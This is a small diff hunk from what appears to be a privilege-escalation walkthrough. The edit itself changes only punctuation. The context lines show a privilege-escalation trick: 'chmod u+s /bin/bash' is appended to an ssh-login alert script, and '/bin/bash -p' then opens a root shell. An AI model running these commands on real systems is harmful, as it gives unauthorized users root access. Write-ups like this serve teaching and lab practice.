@@ -379,7 +379,7 @@ fi
 echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh
 ```
 
-It is launched on successful ssh logins, which is easy to trigger.
+It is launched on successful ssh logins, which is easy to trigger:
 
 ```shell
 /bin/bash -p
